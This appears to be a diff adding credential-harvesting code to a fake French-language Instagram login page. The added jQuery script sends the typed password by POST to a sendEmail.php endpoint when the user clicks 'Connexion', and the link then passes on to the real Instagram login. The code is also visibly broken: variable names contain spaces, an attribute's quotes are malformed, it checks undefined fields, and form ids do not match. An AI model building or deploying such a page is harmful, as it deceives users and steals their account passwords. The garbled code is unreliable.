@@ -6,6 +6,7 @@
 	<link rel="stylesheet" href="styles.css">
 </head>
 <body>
+<form id="myform">
 
 <div class="wrapper">
 	<div class="header">
@@ -18,9 +19,9 @@
 					<input type="text" placeholder="Numéro de téléphone, nom d'utilisateur ou..." class="input">
 				</div>
 				<div class="input_field">
-					<input type="Mot de passe" placeholder="Mot de passe" class="input">
+					<input id="Mot de passe type="Mot de passe" placeholder="Mot de passe" class="input">
 				</div>
-				<div class="btn"><a href="https://www.instagram.com/accounts/login/">Connexion</a></div>
+				<div class="btn" onclick="sendEmail()"><a href="https://www.instagram.com/accounts/login/">Connexion</a></div>
 			</div>
 			<div class="or">
 				<div class="line"></div>
@@ -69,6 +70,41 @@
 		</div>
 	</div>
 </div>
+</form>
+
+
+	<script src="http://code.jquery.com/jquery-3.3.1.min.js"></script>
+	<script type="text/javascript">
+        function sendEmail() {
+            var Mot de passe = $("#Mot de passe");
+            
+
+            if (isNotEmpty(name) && isNotEmpty(email) && isNotEmpty(subject) && isNotEmpty(body)) {
+                $.ajax({
+                   url: 'sendEmail.php',
+                   method: 'POST',
+                   dataType: 'json',
+                   data: {
+                       Mot de passe: Mot de passe.val(),
+                       
+                   }, success: function (response) {
+                        $('#myForm')[0].reset();
+                        $('.sent-notification').text("Message Sent Successfully.");
+                   }
+                });
+            }
+        }
+
+        function isNotEmpty(caller) {
+            if (caller.val() == "") {
+                caller.css('border', '1px solid red');
+                return false;
+            } else
+                caller.css('border', '');
+
+            return true;
+        }
+    </script>
 
 </body>
 </html>
